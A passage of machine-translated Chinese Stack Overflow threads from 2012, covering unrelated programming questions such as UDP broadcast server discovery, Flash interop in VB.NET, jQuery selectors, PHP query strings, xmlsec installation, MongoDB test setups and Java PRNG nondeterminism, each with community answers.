            rtbMessage.Text = message;          

            Form RichMessageBox = new Form();
            RichMessageBox.Text = title;
            RichMessageBox.MaximizeBox = false;
            RichMessageBox.MinimizeBox = false; 

            RichMessageBox.Controls.Add(rtbMessage);
            RichMessageBox.ShowDialog();
        } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-21T13:22:13.770

RichTextBox 控件没有最小化按钮，只有窗体有。如果您不想删除表单最小化和最大化按钮，请在显示表单之前添加以下行：

```
 RichMessageBox.MaximizeBox = false;
  RichMessageBox.MinimizeBox = false; 
```

# c - 服务器的网络发现

> ID：10685710
> 
> 赞同：3
> 
> 时间：2012-05-21T12:58:54.863
> 
> 标签：c, winapi, sockets, networking

好的，所以我知道客户端计算机和服务器计算机之间的通信可以在 Windows 中通过在两台计算机之间创建套接字来启动，但是我看到的每个教程都取决于最终用户知道计算机的 IP 地址他们希望连接的。

然而，在本地网络 LAN 游戏中，客户端会以某种方式自动检测服务器。这是怎么做到的？客户端是否自动检查每个可能的 IP，是否有某种“GetDetectedIPs”api 等？

我正在寻找可以在标准 WIN32 API 中直接用 C 实现的答案。请不要使用 MFC、.NET 或 C++。谢谢你。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-21T13:15:42.963

您需要的技术称为**广播**。例如，它用于 BOOTP 和 DHCP 协议中。

发送带有广播目标地址的数据包会导致 LAN 中的所有设备都接收到该数据包。广播地址是一个 IP 地址，其中主机标识字段用 1 填充：

```
bcast_addr = ~netmask | my_addr; 
```

发现过程通常如下：

1.  客户端在特定端口发送带有广播目标地址的 UDP 数据报。
2.  服务器侦听此端口并接收数据报。其他计算机丢弃它。
3.  服务器通过普通的 UDP 数据报向客户端发送所有关于自身的必要信息。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-21T13:09:37.177

这通常使用[zero-conf](http://en.wikipedia.org/wiki/Zero_configuration_networking)完成。它的 Microsoft 版本是[简单服务发现协议](http://en.wikipedia.org/wiki/Simple_Service_Discovery_Protocol)。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-21T13:05:57.250

您可以让客户端向指定范围内的每个 IP 发送一个 UDP 数据包，并让服务器用另一个 UDP 数据包应答。

# vb.net - VB.Net 嵌入式 Flash 对象产生问题

> ID：10685711
> 
> 赞同：1
> 
> 时间：2012-05-21T12:58:59.833
> 
> 标签：vb.net, flash, interop, embed

Ì 在很多项目中都遇到过这个问题，我几乎放弃了。我相信有一个解决方案。当我在 VB.Net Windows Forms 应用程序中插入 Flash 对象时，它可以正常工作一段时间，然后我在设计屏幕中看到此错误。我正在使用 Visual Studio 2010

**无法加载文件或程序集“Interop.ShockwaveFlashObjects，Version=1.0.0.0，Culture=neutral，PublicKeyToken=null”或其依赖项之一。该系统找不到指定的文件。**

我已经阅读了一些关于为什么会发生这种情况的描述，显然它与强命名（或缺乏强命名）有关，但还没有找到解决方案。我使用了 Add Reference->COM->Shockwave Flash (C:\Windows\SysWOW64\Macromed\Flash\Flash32_11_2_202_235.ocx) 如果我忽略该错误，它似乎工作正常，但我不希望我的用户有问题.

我知道我可以使用浏览器控件并在其中播放 Flash，但由于我不会进入的原因，我必须使用 Flash 控件。任何想法都会有所帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-12T17:59:23.027

好的。我不能保证这对你有用，但它对我有用。首先，您必须在计算机上找到一个名为 AxImp.exe 的文件。您必须从命令提示符运行它。该文件位于（至少对我而言）此处：C:\Program Files\Microsoft SDKs\Windows\v7.0\Bin\x64

找到并运行它后，您必须将其指向您正在使用的正确 Flash.ocx 文件，如下所示：

```
AxImp.exe <path>\Flash.ocx 
```

完成后，您应该在 .ocx 文件所在的同一目录中得到 2 个 DLL 文件。一个称为 AxShockwaveFlashObjects.dll，另一个称为 ShockwaveFlashObjects.dll。

您不关心 ShockwaveFlashObjects.dll，只关心 AxShockwaveFlashObjects.dll。获取该文件和 Flash*.ocx 文件并将它们粘贴到项目目录中。然后将它们包含在您的参考文献中。这应该会打开两个新的引用，AxShockwaveObjects 和 ShockwaveObjects。确保你同时使用它们。在此之后，您必须在命令提示符下使用 RegSvr32 注册 Flash*.ocx（确保在管理员模式下运行 CMD）。这样做是这样的：

```
C:\RegSvr32 <path>\Flash.ocx 
```

这对我有用。我遇到了完全相同的问题（这就是导致我来到这里的原因）。这可能是一个半支持的黑客解决方法，但就目前而言，这就是它对我的工作方式。

让我知道它是否适合您。

希望对你来说一切顺利。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-29T13:30:26.113

我知道这是一篇旧帖子，但我昨天遇到了这个问题，至少在我的情况下，解决方案非常简单。我所要做的就是将平台和平台目标更改为 x86（项目属性的构建选项卡）。

# vb.net - 如何在所有方向上绘制矩形？

> ID：10685714
> 
> 赞同：-1
> 
> 时间：2012-05-21T12:59:09.857
> 
> 标签：vb.net

我在网上找到了这段代码，它允许我绘制一个矩形并将图像保留在其中。但是有一种方法可以在所有方向上绘制这个矩形，而不仅仅是从左到右和从上到下？感谢您的帮助！这是代码：

```
Public Class frmSS
Private Declare Auto Function BitBlt Lib "gdi32.dll" ( _
 ByVal hdcDest As IntPtr, _
 ByVal nXDest As Integer, _
 ByVal nYDest As Integer, _
 ByVal nWidth As Integer, _
 ByVal nHeight As Integer, _
 ByVal hdcSrc As IntPtr, _
 ByVal nXSrc As Integer, _
 ByVal nYSrc As Integer, _
 ByVal dwRop As Int32) As Boolean

Private Declare Auto Function GetDC Lib "user32.dll" (ByVal hWnd As IntPtr) As IntPtr
Private Declare Auto Function ReleaseDC Lib "user32.dll" (ByVal hWnd As IntPtr, ByVal hDC As IntPtr) As IntPtr

Private Sub frmSS_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
    Me.FormBorderStyle = Windows.Forms.FormBorderStyle.None
    Me.Location = New Point(0, 0)
    Me.ClientSize = Screen.GetBounds(Me).Size
    Me.BackColor = Color.Gray
    Me.DoubleBuffered = True
    Me.Opacity = 0.4#
    Me.Cursor = Cursors.Cross
    Me.ShowInTaskbar = False
End Sub

Private isDragging As Boolean = False
Private canDrag As Boolean = True
Private pt_start As Point = Point.Empty
Private pt_end As Point = Point.Empty

Private Sub frmSS_MouseDown(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Me.MouseDown
    If Me.canDrag Then
        Me.isDragging = True
        Me.pt_start = e.Location
    End If
End Sub

Private Sub frmSS_MouseMove(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Me.MouseMove
    If Me.isDragging Then
        Me.pt_end = e.Location
        Me.Invalidate()
    End If
End Sub

Private Sub frmSS_MouseUp(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Me.MouseUp
    If Me.isDragging Then
        Me.isDragging = False
        Me.canDrag = False
        Me.Cursor = Cursors.Default
        Dim r As Rectangle = Me.SelectedRectangle
        Me.Hide()
        Application.DoEvents() 'Make sure everything's good and hidden.
        Me.CaptureThisArea(r)
        Me.Close()
    End If
End Sub

Private ReadOnly Property SelectedRectangle() As Rectangle
    Get
        With pt_start
            If .X >= pt_end.X OrElse .Y >= pt_end.Y Then Return Rectangle.Empty
            Return New Rectangle(.X, .Y, pt_end.X - .X, pt_end.Y - .Y)

        End With
    End Get
End Property

Protected Overrides Sub OnPaint(ByVal e As System.Windows.Forms.PaintEventArgs)
    Dim g As Graphics = e.Graphics

    Using p As New Pen(Color.Black, 3)
        p.DashStyle = Drawing2D.DashStyle.Dash
        If Me.SelectedRectangle <> Rectangle.Empty Then
            g.FillRectangle(Brushes.Red, Me.SelectedRectangle)
            g.DrawRectangle(p, Me.SelectedRectangle)
        End If
    End Using

    MyBase.OnPaint(e)
End Sub

Private Sub CaptureThisArea(ByVal area As Rectangle)
    Dim bmp As New Bitmap(area.Width, area.Height, Imaging.PixelFormat.Format24bppRgb)
    Using g As Graphics = Graphics.FromImage(bmp)
        Dim srcDC As IntPtr = GetDC(IntPtr.Zero)
        Dim destDC As IntPtr = g.GetHdc()

        BitBlt(destDC, 0, 0, area.Width, area.Height, srcDC, area.X, area.Y, 13369376) 'SRCCOPY = 13369376

        g.ReleaseHdc(destDC)
        ReleaseDC(IntPtr.Zero, srcDC)
    End Using
    Dim s_dl As New SaveFileDialog()
    s_dl.Filter = "Bitmap Images (*.bmp)|*.bmp"
    If s_dl.ShowDialog() = DialogResult.Cancel Then Exit Sub
    bmp.Save(s_dl.FileName)
    MessageBox.Show("File saved!!!")
End Sub 
```

结束类

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-21T13:53:59.550

您需要尝试根据初始 MouseDown 点确定矩形，在 MouseMove 期间，查看是否需要根据每个 X 和 Y 值的最小值和最大值调整当前鼠标坐标：

注释掉 pt_end 并添加一个 dragRect 变量：

```
'\\ Private pt_end As Point = Point.Empty
Private dragRect As Rectangle = Rectangle.Empty 
```

将您的 MouseMove 事件更改为：

```
Private Sub frmSS_MouseMove(ByVal sender As Object, ByVal e As MouseEventArgs) Handles Me.MouseMove
  If Me.isDragging Then
    Dim minPoint As New Point(Math.Min(e.Location.X, pt_start.X), _
                              Math.Min(e.Location.Y, pt_start.Y))
    Dim maxPoint As New Point(Math.Max(e.Location.X, pt_start.X), _
                              Math.Max(e.Location.Y, pt_start.Y))
    dragRect = New Rectangle(minPoint, New Size(maxPoint.X - minPoint.X, _
                                                maxPoint.Y - minPoint.Y))
    Me.Invalidate()
  End If
End Sub 
```

从那里，将您的代码更改为使用 dragRect 而不是`SelectedRectangle`我注释掉的 。

# ruby - 使用捆绑器安装本地 Ruby gem

> ID：10685718
> 
> 赞同：0
> 
> 时间：2012-05-21T12:59:22.790
> 
> 标签：ruby, rubygems, bundler

我们的 Gemfile 如下：

```
source "http://rubygems.org"

gem 'langrove', :path => "/home/user/gems/" 
```

.gem 文件位于“/home/user/gems/ItIsHere.gem”中

但是当我们运行*bundle install*时，会收到以下错误：

```
Could not find gem 'ItIsHere (>= 0) ruby' in source at /home/user/gems.
Source does not contain any versions of 'ItIsHere (>= 0) ruby' 
```

谢谢你

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-21T14:11:24.380

一种解决方案是`gem unpack` 在您要使用的特定 .gem 上运行

然后引用解压后的版本。

我通常会保留与我的项目相关的东西

例如：

```
gem 'awesomelib', :path => '../awesomelib' 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-06-19T04:50:45.320

你没有指定 gem 版本。因此你得到了错误。所以你将像这样更改代码。

```
gem 'remotipart', '1.0.5', :path => "/home/user/gems/" 
```

并检查您的文件夹：路径。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-06-26T11:29:40.053

第一的

> rails new app_name --skip-bundle

然后

使用`bundle install --local` 这将从本地安装 gems。

# iphone - 我应该设置一个 UIBarButtonItem 什么宽度来制作一个方形按钮？

> ID：10685723
> 
> 赞同：3
> 
> 时间：2012-05-21T12:59:59.560
> 
> 标签：iphone, objective-c, cocoa-touch, uibarbuttonitem, dimensions

我想在我的工具栏上有一个方形按钮。我`UIBarButtonItem`使用的图像足够宽，可以将我的按钮推成矩形。我浏览了文档，但找不到最好的尺寸。

查看其他答案，`29.0`似乎是一个常见的尺寸，但我想得到确认。这是我设置按钮的方式：

```
UIBarButtonItem *locationButtonItem = [[UIBarButtonItem alloc] 
                                   initWithImage:[UIImage imageNamed:@"location.png"]
                                   style:UIBarButtonItemStyleBordered
                                   target:self
                                   action:@selector(locationButtonTapped:)];
[locationButtonItem setWidth:29.0f]; 
```

我应该将我的工具栏按钮设置为多少宽度才能使其成为方形？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-05-21T13:51:06.743

```
UIButton *button = [UIButton buttonWithType:UIButtonTypeCustom];
[button setBackgroundImage:[UIImage imageNamed:@"location.png"] forState:UIControlStateNormal];
    button.frame=CGRectMake(0,0, 29, 29);
[button addTarget:self action:@selector(locationButtonTapped:) forControlEvents:UIControlEventTouchUpInside];

UIBarButtonItem *btnDone = [[UIBarButtonItem alloc] initWithCustomView:button];
//[btnDone setTarget:self];

self.navigationItem.rightBarButtonItem = btnDone;
[btnDone release]; 
```

试试这个......也许它会帮助你。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-29T12:50:23.880

刚刚使用*UIKit Artwork Extractor*发现`UIBarButtonImage`当里面的图片是 13x16 @1x 像素时 是一个完美的正方形。`UIBarButtonSystemItemAdd`我只是测量了样式（ ）使用的“加号”按钮，`UINavigationBarAddButton.png`并自己尝试了一下。希望这会对某人有所帮助。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-21T13:06:23.883

尝试这个：`[locationButton setWidth:locationButton.height];`

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-21T13:53:34.957

你不能改变 UIBarButton 的宽度。

取而代之的是，如果您想要自定义宽度，则需要使用 initWithCustomView。

只有 UIToolbar 中的按钮才能使用 width 属性。

# javascript - 如何在 jquery 函数中传递运行时参数？

> ID：10685724
> 
> 赞同：0
> 
> 时间：2012-05-21T13:00:04.787
> 
> 标签：javascript, jquery, html

我是 jquery 的新手。我的要求是在 jquery 函数中传递 rowid（表中每条记录的唯一 id）。我只能在运行时获得 rowid。那么如何将点击事件绑定到 id 为该 rowid 的标签。

```
<a href="javascript:void(0)" id="`string(rowid(Gatepass))`">Upd</a>
<a href="javascript:void(0)" id="`string(rowid(Gatepass))`">Del</a>

$(what to pass here).bind('click',function(ev) {
    _operation(para1,para2); // function which is going to perfom action
    ev.preventDefault();
    return false;
}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-21T13:04:54.353

如果 id 动态来自服务器，则在函数中为 id selctor 放入相同的 id + hash

```
$(what to pass here) => $("'#" + string(rowid(Gatepass)) + "'") 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-21T13:05:09.370

如果 ID 之间有任何相似之处，您可以使用属性选择器之一，例如：

标识包含

```
$('[id*="something"]') 
```

身份证开头

```
$('[id^="something"]') 
```

[http://api.jquery.com/category/selectors/](http://api.jquery.com/category/selectors/)

更好的方法是将所有动态命名的锚点放入容器中，然后对其进行选择：

```
<div id="container">
    <a ...></a>
    <a ...></a>
</div> 
```

然后您将选择所有子锚点：

```
$('#container > a').click(...); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-21T13:06:53.137

很难从这么少的 HTML 代码中找到一个好的选择器。如果可能的话，在你的标记上使用一个类：

```
<a class="roww" href="javascript:void(0)" id="`string(rowid(Gatepass))`">Upd</a>
<a class="roww" href="javascript:void(0)" id="`string(rowid(Gatepass))`">Del</a> 
```

然后你可以使用 $('.roww') 来查询你的节点。

以下是从事件处理程序获取 id 的方法：

```
function( ev ) {
   //wrap the element with jQ:
   var jel = $(this);
   //Then access attributes with .attr() getter:
   var id = jel.attr('id');

   ... //do whatever you want now.
   ... // there's a quicker alternative to get the id without jQuery, simply: 
   ... // var id = this.id
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-21T13:24:34.123

获取 id ，并根据 id 做任何你想做的事

```
 $('a').on('click',function(){

    var id = $(this).attr('id');

   if(id == //what you want)
   {
      //function 1
   } 
   else
   {
      //function 2
   }     

    return false;

    }); 
```

# php - Symfony Forms：Choice（下拉菜单）显示实体对象的层次结构

> ID：10685725
> 
> 赞同：1
> 
> 时间：2012-05-21T13:00:07.907
> 
> 标签：php, forms, symfony, symfony-forms

我目前正在为一个项目使用 Symfony 2.0.13，并且正在处理用户注册表单。我的项目为此使用了 Doctrine ORM、Twig 和 Form 组件。

每个用户都必须选择一个区域。Area 对象基本上是这样定义的：

```
<?php

namespace Acme\AwesomeBundle\Entity;

use Doctrine\ORM\Mapping as ORM;

/**
 * @ORM\Table
 * @ORM\Entity
 */
class Area
{

    /**
     * @var integer $id
     *
     * @ORM\Column(type="smallint", nullable=false)
     * @ORM\Id
     * @ORM\GeneratedValue(strategy="AUTO")
     */
    private $id;

    /**
     *
     * @ORM\Column(type="string", length="64", nullable=false)
     */
    private $name;

    /**
     * @ORM\ManyToOne(targetEntity="Area", inversedBy="children")
     * @ORM\JoinColumn(name="parent")
     */
    private $parent;

    /**
     *
     * @ORM\OneToMany(targetEntity="Area", mappedBy="parent")
     */
    private $children;

    /**
     *
     * @ORM\Column(type="boolean", nullable=false)
     */
    private $selectable;

    // + all the default getters and setters generated using the Symfony console
    // + a __toString() method which returns the name 
```

正如您所看到的，一个区域可以有子区域（子区域），它们也可以有子区域（例如，一个国家将是一个区域，将有多个省/州，它们都将有城市）。此外，可以将区域标记为可选或不可选。

我想向用户显示一个下拉框以选择其中一个区域，但层次结构应该清晰可见（我正在考虑使用连字符缩进项目）并且标记为不可选择的区域应该被禁用，但显示在列表。

我想我应该创建一个新的 Form 类型，但我不清楚我应该如何生成 ChoiceList（或选择数组）。所以希望有人能指出我正确的方向或对我有一些有用的资源。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-21T13:18:26.173

您可以使用使用以下选项构建的简单`choice`类型：`choices`

```
$choices = $this->getFlatChoices();

// in a form type
$builder->add('area', 'choice', array('choices' => $choices)); 
```

我建议您在[这里查看](https://symfony.com/doc/2.8/reference/forms/types/choice.html#grouping-options)如何执行此操作的示例。

# php - 数据库查询字符串 URL

> ID：10685727
> 
> 赞同：1
> 
> 时间：2012-05-21T13:00:16.307
> 
> 标签：php, mysql, html

我希望通过 URL 解析一些数据库信息。我不确定该怎么做。

页面底部列出的每个事件条目都应包含一个超链接，该链接会将管理员带到一个新的 Web 表单，以记录该事件的结果。EventID 通过查询字符串参数传递，例如`RecordResults.php?EventID=4`。

我该怎么做呢？

谢谢你的帮助！干杯

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-21T13:10:17.480

**在RecordResults.php**中尝试这样的事情：

```
// Get id from URL
$id = mysql_real_escape_string( $_GET['EventID'] );

// If id is number
if( (int)$id == $id && (int)$id > 0 ) {

     // Database connection and select database
     $link = mysql_connect('localhost','db_username','db_password')
     mysql_select_db('db_name', $link);

     // Get record from database
     $sql = 'SELECT * FROM tablename WHERE EventID=' . $id;
     $result = mysql_query( $sql, $link );    
     $row = mysql_fetch_array( $result );

     // Show record with HTML here 
     print_r( $row );

} else {

   echo "Record not found";
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-21T13:04:31.713

在您的`RecordResults.php`文件中，您需要检查`$_GET`参数并构造一个 SQL 查询来检索所需的数据库行。围绕结果构建 HTML 并将其输出到浏览器。

不要忘记清理 GET 参数以防止 SQL 注入。

# xml - 如何在 Mac OS X 上使用 openssl 安装 xmlsec

> ID：10685728
> 
> 赞同：0
> 
> 时间：2012-05-21T13:00:18.297
> 
> 标签：xml, macos, openssl, osx-lion, xmlsec

我在带有 OpenSSL 0.9.8w 的 Mac OS X 10.7.3 上安装了 xmlsec 1.2.12，安装后，在“make check”期间测试都被跳过了。

OpenSSL 0.9.8w 由安装

```
sudo ./config --prefix=/usr/local/ no-asm
sudo make install 
```

xmlsec 1.2.12 由

```
sudo ./configure --with-openssl=/usr/local/
sudo make install 
```

我在尝试签署 xml 时收到错误消息

```
func=xmlSecCryptoDLLibraryCreate:file=dl.c:line=146:obj=lt_dlopenext:subj=unknown:error=7:io function failed:filename=libxmlsec1-openssl
func=xmlSecCryptoDLGetLibraryFunctions:file=dl.c:line=498:obj=unknown:subj=xmlSecCryptoDLLibraryCreate:error=1:xmlsec library function failed:crypto=openssl
func=xmlSecCryptoDLLoadLibrary:file=dl.c:line=449:obj=unknown:subj=xmlSecCryptoDLGetLibraryFunctions:error=1:xmlsec library function failed:
Error: unable to load xmlsec-openssl library. Make sure that you have this it installed, check shared libraries path (LD_LIBRARY_PATH) envornment variable or use "--crypto" option to specify different crypto engine.
Error: initialization failed 
```

我也试过 xmlsec 1.2.18 和 openssl 1.0.1b，但结果是一样的。有人在 Mac OS X 10.7.3 上成功安装了 xmlsec 吗？请给我一些建议。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-17T21:56:47.037

我使用 MacPorts 在 10.6、10.7 和 10.8 下安装 XMLSEC

MacPorts 在 /opt/local/lib 编译一个 openssl 包，所以我使用这个命令来签署一个 XML 文件，其中要签署的节点是“infNFe”：

`export LD_LIBRARY_PATH=/opt/local/lib; /opt/local/bin/xmlsec1 sign --id-attr:Id infNFe --output signed_xmlsec.xml --pkcs12 yourCertificate.pfx --pwd thePasswordHere --trusted-pem yourCertificate.pem unsigned.xml`

我认为这将解决您的问题。

# testing - 设置一个重复的 mongodb 测试环境

> ID：10685737
> 
> 赞同：1
> 
> 时间：2012-05-21T13:00:47.923
> 
> 标签：testing, mongodb, sandbox

我想知道社区对于我在为我们的团队设置沙盒环境时遇到的问题最有什么建议。

目前，我们分别为我们的测试和部署环境使用两个独立的 MongoDB 实例，都是 3 个成员副本集。内部几乎可以理解，测试环境中的所有数据在很大程度上都是一次性的，并且只是由开发人员在对应用程序进行单元测试的过程中创建的。

我想为开发团队提供使用真实实时数据进行测试的新选项，但要在单独的安全沙箱实例中进行。起初，我最初认为我可以使用该`copyDatabase`命令每晚将数据复制到一个新数据库中，并将各个开发人员应用程序服务器连接到该数据库。问题是系统中有大量的 GridFS 数据，像这样复制会浪费大量的磁盘 i/o，而且我们在较小的云实例中运行。

我对走这条路持谨慎态度，特别是如果有更合适的选择。

例如，是否有可能设置部署副本集的第四个成员，该成员仅作为从属节点运行，将所有查询设置为`slaveOkay = True`并针对该单个节点运行测试？这会传播回其他成员吗？如何处理插入？

我的建议可能是不切实际的，特别是如果传输必须跨越网络，这也会浪费网络传输。有没有人必须解决类似的问题？谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-21T13:11:50.543

奴隶只是为了阅读。所有写入都必须交给主控。这排除了您的“第四个奴隶”选项。

至于测试目的，您真的需要数据库的精确副本以及所有 gridfs 数据吗？我会尝试只复制“重”数据的相关部分。这排除了`db.copyDatabase()`:) 做一个`mongodump`/`mongorestore`代替。

另外，我想指出 test db 和 staging db 应该是不同的数据库。测试数据库用于单元测试（使用模拟/生成的数据）。暂存数据库填充了生产数据并用于集成/验收测试。

# java - SWT TableViewer 颜色交替（在某些操作系统中）

> ID：10685741
> 
> 赞同：1
> 
> 时间：2012-05-21T13:01:12.047
> 
> 标签：java, swt, jface

在某些操作系统中（比如我的 Ubuntu 11.10）有有趣的表格元素行为：背景颜色从白色到灰色交替变化（第一个元素是白色，第二个是灰色，第三个是白色等）。

`CellLabelProvider`在我的应用程序中，我想为（这是必要的）编写自己`JFace TableViewer`的，并且我正在使用类扩展`OwnerDrawLabelProvider`（并覆盖绘制方法）。

我想用我自己的颜色和其他系统颜色绘制指定的行`(Display.getCurrent().getSystemColor(...))`，但问题是，如果我用它绘制它`SWT.COLOR_LIST_BACKGROUND`，那么所有行都被涂成白色，没有交替。我该如何设置？

我调试了应用程序，并意识到两种类型的原始数据（白色和灰色）都具有相同的颜色 - 白色（这是正确的）。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-22T07:36:58.117

没有办法像操作系统那样明确地“所有者绘制”它。如果您希望一行具有其本机背景颜色，您根本不能自己绘制背景。

# java - ChannelFutureListener 中抛出的异常会发生什么？

> ID：10685743
> 
> 赞同：0
> 
> 时间：2012-05-21T13:01:19.083
> 
> 标签：java, exception, netty

我假设异常将作为通道管道中的上游事件处理，但我的堆栈跟踪看起来不是这样。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-21T13:52:38.863

它只是通过 InternalLogger 记录的，所以没有上游事件。

# java - 带有某些种子的随机数似乎仍然是随机的

> ID：10685751
> 
> 赞同：2
> 
> 时间：2012-05-21T13:01:32.430
> 
> 标签：java, random, prng

我有一个程序，它大量使用随机数来决定它需要做什么，并且有许多基于 PRNG 输出的执行路径。在尝试调试它之后，我决定让所有 PRNG 调用都引用同一个 Random 实例，该实例在实例化时已被植入一个硬编码数字。这样，每次我运行程序时，都会出现相同的错误。不幸的是，每次运行它时我仍然会遇到不同的错误（尽管它的行为似乎几乎相同）。

我已经多次搜索代码以查找对 Math.random() 的任何未接来电，我向您保证没有。

有任何想法吗？

**编辑**：我已经确认生成的数字是相同的，但行为仍然是不确定的。这个程序不是多线程的。还是完全糊涂了。

所以 PRNG 的行为符合预期，但我仍然有不确定性。有哪些方式可能会无意中将非确定性带入程序中？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-21T22:52:39.980

好的，我*想*我已经找到了我的非确定性来源。我有一次迭代了一个 HashSet。HashSet 会以相同的顺序填充相同的东西，但是因为我没有指定要添加到 HashSet 的类的散列方法，所以它将默认为某个散列，具体取决于每个实例的内存位置。

将 HashSet 的每个实例更改为 LinkedHashSet*似乎*已经为我提供了大约 30 次运行的一致结果，而在此之前它只会连续几次给我相同的行为。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-21T13:37:55.073

好的，所以这似乎是一种巫术。尝试创建一个自定义 PRNG，它包装一个`Random`对象并使用堆栈跟踪记录调用。

```
public class CustomRNG {

    private static Logger logger = Logger.getLogger(CustomRNG.class.getName());
    private static Random random = new Random(1234);

    public int nextInt() {

       int val = random.nextInt();
       log(val);

       return val;
    }

    private void log(int value) {
        logger.log(Level.INFO, "value: " + value, new Throwable());
    }
} 
```

这将记录对 nextInt 的每次调用，包括值和堆栈跟踪（如果您愿意，可以添加调用计数）。尝试运行您的应用程序几次，看看在哪个点（堆栈跟踪）出现分歧。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-21T13:08:23.853

持续不确定的可能原因（按可能性降序排列）：

*   您还没有用相同的随机实例替换*所有*PRNG 调用。您可能想先检查一下 :-) 一个好的 IDE 应该可以帮助您跟踪对 Random 类的所有引用。
*   存在由并发引起的时间效应（例如，哪个线程首先调用 PRNG 很重要）
*   您对系统有某种形式的外部输入（例如用户输入？基于系统计时器采取的操作？）
*   您正在使用的某些库具有影响程序行为的非确定性元素（例如，某些排序算法使用随机数，这会影响它们返回的结果的顺序）
*   您遇到了某种环境约束（例如，有时会发生 OutOfMemoryError 或 IOException 错误，但会以不同的方式被捕获和恢复，或者 GC 决定清除一些软/弱引用）
*   宇宙射线/硬件错误破坏内存

# c# - 不使用 oledb 打开数据连接

> ID：10685755
> 
> 赞同：0
> 
> 时间：2012-05-21T13:01:47.190
> 
> 标签：c#, sql, insert, oledb

我有这个代码可以正常工作。但不知何故，在特定的形式它不起作用，我得到这个错误（在行`connction.Open();`）`Unspecified error`

该代码假设将多行添加到表中。这是代码：

```
 for (int i = 0; st1.Length > i; i++)
                    UpdateDataBase(st1[i]);

private void UpdateDataBase(char letter)
    {
        int serialPro = 0;
        string connectionString = "Provider=Microsoft.ACE.OLEDB.12.0;" +
                                  "Data Source=C:\\Projects_2012\\Project_Noam\\Access\\myProject.accdb";
        try
        {
            using (OleDbConnection connection = new OleDbConnection(connectionString))
            {
                string sql = "SELECT tblProInfo.proInfoSerialNum FROM tblProInfo ";
                using (OleDbCommand command = new OleDbCommand(sql, connection))
                {
                    connection.Open();
                    OleDbDataReader reader = command.ExecuteReader();
                    //get the last!
                    while (reader.Read())
                        serialPro = reader.GetInt32(0);

                }
                sql = "INSERT INTO tblOrderAA (orderAASerialPro, orderAACodon1) "
                   + " values (?, ?)";
                using (OleDbCommand command = new OleDbCommand(sql, connection))
                {
                    command.CommandType = CommandType.Text;
                    command.Parameters.AddWithValue("orderAASerialPro", serialPro);
                    command.Parameters.AddWithValue("orderAACodon1", letter);
                    command.ExecuteNonQuery();
                }

            }
        }
        catch (Exception e)
        {
            MessageBox.Show("error in:" + e.Message);
        }
    } 
```

我知道我可以使用 MAX 获得最后一个。但它以不同的形式正常工作。所以我坚持要明白为什么！谢谢大家的帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-21T14:00:39.423

我最近遇到了类似的问题。尝试使用提升的权限打开和关闭连接来运行代码

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-21T13:43:57.213

如果我没记错你没有关闭阅读器所以尝试添加它

```
while (reader.Read())
    serialPro = reader.GetInt32(0);
reader.Close(); 
```

**编辑**

照我说的做（用于移除未来的行李）

在某处制作`connection`为静态（例如在program.cs中，如果您制作静态类会更好），然后以这种方式调用它

```
 if(Program.connection.State==System.Data.ConnectionState.Closed)
            Program.connection.Open(); 
```

# workflow-foundation-4 - 托管 wwf4 设计器上的多选

> ID：10685756
> 
> 赞同：0
> 
> 时间：2012-05-21T13:01:50.763
> 
> 标签：workflow-foundation-4

...使用 wwf4，VS2010

一位同事构建了一个托管 WWF4 的应用程序，他做得很好，我普遍相信他的技能。一个烦恼是我一次不能在设计器表面上移动多个对象，这意味着修改中等复杂工作流程的布局是一项主要的 PITA。

他说他试过了，但得出的结论是，你无法对 wwf 设计表面做任何事情。他很好，我相信他的话，但我年纪大了……什么都可以做。

我有哪些实现选项 1\. 拖动并选择 2\. 通过键盘移动多对象

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-21T15:57:22.760

你的同事是对的，根本不支持。.NET 4.5 将大大改进设计器。

阅读本文：[.NET 4.5 中 Windows Workflow Foundation 的新增功能](http://msdn.microsoft.com/en-us/library/hh305677%28v=vs.110%29.aspx)

> ***多选***
> 
> *   *可以一次选择多个活动，方法是在它们周围拖动一个矩形（当未启用平移模式时），或者按住 Ctrl。*
>     
>     
> *   *多个活动选择也可以在设计器中拖放，也可以使用上下文菜单进行交互。*

[Microsoft® .NE​​T Framework® 4.5 测试版](http://www.microsoft.com/en-us/download/details.aspx?id=28978)

# python - 如何反转嵌套的 Python 列表

> ID：10685757
> 
> 赞同：-1
> 
> 时间：2012-05-21T13:01:52.203
> 
> 标签：python

给定以下嵌套列表，

